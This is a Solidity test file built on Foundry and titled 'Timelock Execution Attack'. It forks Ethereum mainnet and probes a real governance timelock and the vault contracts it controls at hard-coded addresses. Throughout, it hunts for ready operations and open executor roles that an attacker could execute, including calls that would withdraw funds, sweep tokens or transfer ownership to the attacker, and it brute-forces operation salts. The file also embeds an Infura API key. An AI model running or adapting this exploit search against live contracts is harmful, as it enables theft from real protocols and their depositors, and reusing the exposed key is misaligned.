// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ITimelock {
    function hashOperation(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt) external pure returns (bytes32);
    function isOperation(bytes32 id) external view returns (bool);
    function isOperationPending(bytes32 id) external view returns (bool);
    function isOperationReady(bytes32 id) external view returns (bool);
    function isOperationDone(bytes32 id) external view returns (bool);
    function getTimestamp(bytes32 id) external view returns (uint256);
    function getMinDelay() external view returns (uint256);
    function execute(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt) external payable;
    function executeBatch(address[] calldata targets, uint256[] calldata values, bytes[] calldata datas, bytes32 predecessor, bytes32 salt) external payable;
}

/**
 * TIMELOCK EXECUTION ATTACK
 *
 * FINDING: isOperationReady(setDelay(0)) returned TRUE
 * This could mean a pending operation exists that we can execute!
 */
contract TimelockExecutionAttack is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckTimelockOperationStatus() public {
        console.log("=== TIMELOCK OPERATION STATUS ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        // Check various potential operations
        bytes memory setDelay0 = abi.encodeWithSignature("setDelay(uint256)", 0);
        bytes32 opId = timelock.hashOperation(R0, 0, setDelay0, bytes32(0), bytes32(0));

        console.log("setDelay(0) operation ID:");
        console.logBytes32(opId);

        console.log("isOperation:", timelock.isOperation(opId));
        console.log("isOperationPending:", timelock.isOperationPending(opId));
        console.log("isOperationReady:", timelock.isOperationReady(opId));
        console.log("isOperationDone:", timelock.isOperationDone(opId));

        uint256 timestamp = timelock.getTimestamp(opId);
        console.log("Timestamp:", timestamp);

        if (timestamp == 0) {
            console.log("Operation never scheduled (timestamp=0 means doesn't exist)");
        } else if (timestamp == 1) {
            console.log("Operation DONE (timestamp=1)");
        } else {
            console.log("Operation scheduled for:", timestamp);
            console.log("Current time:", block.timestamp);
            if (block.timestamp >= timestamp) {
                console.log("*** OPERATION IS READY TO EXECUTE! ***");
            }
        }
    }

    function test_SearchPendingOperations() public {
        console.log("=== SEARCH PENDING OPERATIONS ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        // Try various function signatures
        bytes[] memory calls = new bytes[](20);
        calls[0] = abi.encodeWithSignature("setDelay(uint256)", 0);
        calls[1] = abi.encodeWithSignature("setDelay(uint256)", 1);
        calls[2] = abi.encodeWithSignature("pause()");
        calls[3] = abi.encodeWithSignature("unpause()");
        calls[4] = abi.encodeWithSignature("setVault(address)", attacker);
        calls[5] = abi.encodeWithSignature("setAsset(address)", attacker);
        calls[6] = abi.encodeWithSignature("withdraw(uint256,address)", type(uint256).max, attacker);
        calls[7] = abi.encodeWithSignature("emergencyWithdraw(address)", attacker);
        calls[8] = abi.encodeWithSignature("setOwner(address)", attacker);
        calls[9] = abi.encodeWithSignature("transferOwnership(address)", attacker);
        calls[10] = abi.encodeWithSignature("upgradeTo(address)", attacker);
        calls[11] = abi.encodeWithSignature("setAdmin(address)", attacker);
        calls[12] = abi.encodeWithSignature("renounceOwnership()");
        calls[13] = abi.encodeWithSignature("rescue(address)", wstETH);
        calls[14] = abi.encodeWithSignature("sweep(address,address)", wstETH, attacker);
        calls[15] = abi.encodeWithSignature("setIAU(address)", attacker);
        calls[16] = abi.encodeWithSignature("updateDelay(uint256)", 0);
        calls[17] = abi.encodeWithSignature("setCooldown(uint256)", 0);
        calls[18] = abi.encodeWithSignature("setRedemptionDelay(uint256)", 0);
        calls[19] = abi.encodeWithSignature("initialize()");

        address[] memory targets = new address[](4);
        targets[0] = R0;
        targets[1] = R1;
        targets[2] = RC;
        targets[3] = VAULT;

        console.log("Scanning for pending/ready operations...");

        for (uint t = 0; t < targets.length; t++) {
            for (uint c = 0; c < calls.length; c++) {
                bytes32 opId = timelock.hashOperation(targets[t], 0, calls[c], bytes32(0), bytes32(0));
                uint256 timestamp = timelock.getTimestamp(opId);

                if (timestamp > 1) { // Exists and not done
                    console.log("Found pending operation!");
                    console.log("Target:", t);
                    console.log("Call:", c);
                    console.log("Timestamp:", timestamp);
                    console.log("Ready:", block.timestamp >= timestamp);
                }
            }
        }

        console.log("Scan complete.");
    }

    function test_TimelockDirectExecution() public {
        console.log("=== TIMELOCK DIRECT EXECUTION ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        // Check if we can execute directly (open executor role?)
        bytes memory setDelay0 = abi.encodeWithSignature("setDelay(uint256)", 0);

        vm.startPrank(attacker);

        console.log("Attempting direct execution...");

        // Try execute
        try timelock.execute(R0, 0, setDelay0, bytes32(0), bytes32(0)) {
            console.log("*** EXECUTE SUCCEEDED! ***");
        } catch Error(string memory reason) {
            console.log("Execute failed:", reason);
        } catch (bytes memory) {
            console.log("Execute failed (low-level)");
        }

        vm.stopPrank();

        // Check delay after
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 delay = (uint256(slot4) >> 96) & type(uint32).max;
        console.log("R0 delay after attempt:", delay / 86400, "days");
    }

    function test_TimelockRoleAnalysis() public {
        console.log("=== TIMELOCK ROLE ANALYSIS ===\n");

        // OpenZeppelin TimelockController roles
        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
        bytes32 EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");
        bytes32 CANCELLER_ROLE = keccak256("CANCELLER_ROLE");
        bytes32 ADMIN_ROLE = bytes32(0); // DEFAULT_ADMIN_ROLE

        console.log("PROPOSER_ROLE:");
        console.logBytes32(PROPOSER_ROLE);
        console.log("EXECUTOR_ROLE:");
        console.logBytes32(EXECUTOR_ROLE);
        console.log("CANCELLER_ROLE:");
        console.logBytes32(CANCELLER_ROLE);

        // Check if anyone can execute (address(0) has EXECUTOR_ROLE)
        (bool s1, bytes memory d1) = TIMELOCK.staticcall(
            abi.encodeWithSignature("hasRole(bytes32,address)", EXECUTOR_ROLE, address(0))
        );
        if (s1 && d1.length > 0) {
            bool anyoneCanExecute = abi.decode(d1, (bool));
            console.log("Anyone can execute:", anyoneCanExecute);

            if (anyoneCanExecute) {
                console.log("*** TIMELOCK IS OPEN - ANYONE CAN EXECUTE! ***");
            }
        }

        // Check if attacker has any role
        (bool s2, bytes memory d2) = TIMELOCK.staticcall(
            abi.encodeWithSignature("hasRole(bytes32,address)", EXECUTOR_ROLE, attacker)
        );
        if (s2 && d2.length > 0) {
            console.log("Attacker has EXECUTOR_ROLE:", abi.decode(d2, (bool)));
        }

        // Check role member count
        (bool s3, bytes memory d3) = TIMELOCK.staticcall(
            abi.encodeWithSignature("getRoleMemberCount(bytes32)", EXECUTOR_ROLE)
        );
        if (s3 && d3.length > 0) {
            uint256 count = abi.decode(d3, (uint256));
            console.log("EXECUTOR_ROLE member count:", count);

            // List members
            for (uint i = 0; i < count && i < 10; i++) {
                (bool s4, bytes memory d4) = TIMELOCK.staticcall(
                    abi.encodeWithSignature("getRoleMember(bytes32,uint256)", EXECUTOR_ROLE, i)
                );
                if (s4 && d4.length > 0) {
                    address member = abi.decode(d4, (address));
                    console.log("  Member", i, ":", member);
                }
            }
        }
    }

    function test_TimelockStorageAnalysis() public {
        console.log("=== TIMELOCK STORAGE ANALYSIS ===\n");

        // Read timelock storage to find operations
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(TIMELOCK, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // Check mapping storage for any operations
        // Operations are stored in: _timestamps mapping at slot X
        // mapping(bytes32 => uint256) _timestamps;

        // If we knew the operation IDs, we could check their timestamps
        // But let's look for non-zero mapping entries
    }

    function test_ExecuteExistingOperation() public {
        console.log("=== EXECUTE EXISTING OPERATION ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        // First check if anyone can execute
        bytes32 EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");
        (bool s1, bytes memory d1) = TIMELOCK.staticcall(
            abi.encodeWithSignature("hasRole(bytes32,address)", EXECUTOR_ROLE, address(0))
        );
        bool openExecutor = s1 && d1.length > 0 && abi.decode(d1, (bool));
        console.log("Open executor (address(0)):", openExecutor);

        if (!openExecutor) {
            console.log("Timelock requires specific executor role");
            return;
        }

        // If open, try to execute any pending operation
        // We need to find a valid operation ID first

        // Common patterns: operations scheduled by protocol team
        // Try setDelay with various values that might have been scheduled
        uint256[] memory delays = new uint256[](5);
        delays[0] = 0;
        delays[1] = 1 days;
        delays[2] = 7 days;
        delays[3] = 14 days;
        delays[4] = 604800; // 7 days in seconds

        for (uint i = 0; i < delays.length; i++) {
            bytes memory callData = abi.encodeWithSignature("setDelay(uint256)", delays[i]);
            bytes32 opId = timelock.hashOperation(R0, 0, callData, bytes32(0), bytes32(0));

            uint256 timestamp = timelock.getTimestamp(opId);
            if (timestamp > 1 && block.timestamp >= timestamp) {
                console.log("Found executable operation!");
                console.log("Delay value:", delays[i] / 86400, "days");

                vm.startPrank(attacker);
                try timelock.execute(R0, 0, callData, bytes32(0), bytes32(0)) {
                    console.log("*** EXECUTED SUCCESSFULLY! ***");

                    // Check if delay changed
                    bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
                    uint256 newDelay = (uint256(slot4) >> 96) & type(uint32).max;
                    console.log("New delay:", newDelay / 86400, "days");
                } catch {
                    console.log("Execution failed");
                }
                vm.stopPrank();
            }
        }
    }

    function test_BruteForceOperationSalts() public {
        console.log("=== BRUTE FORCE OPERATION SALTS ===\n");

        ITimelock timelock = ITimelock(TIMELOCK);

        // Try different salts for common operations
        bytes memory setDelay0 = abi.encodeWithSignature("setDelay(uint256)", 0);

        console.log("Trying salts 0-100...");
        for (uint salt = 0; salt <= 100; salt++) {
            bytes32 opId = timelock.hashOperation(R0, 0, setDelay0, bytes32(0), bytes32(salt));
            uint256 timestamp = timelock.getTimestamp(opId);

            if (timestamp > 0) {
                console.log("Found operation with salt:", salt);
                console.log("Timestamp:", timestamp);
                console.log("Ready:", timestamp > 1 && block.timestamp >= timestamp);
            }
        }

        console.log("Salt search complete.");
    }
}
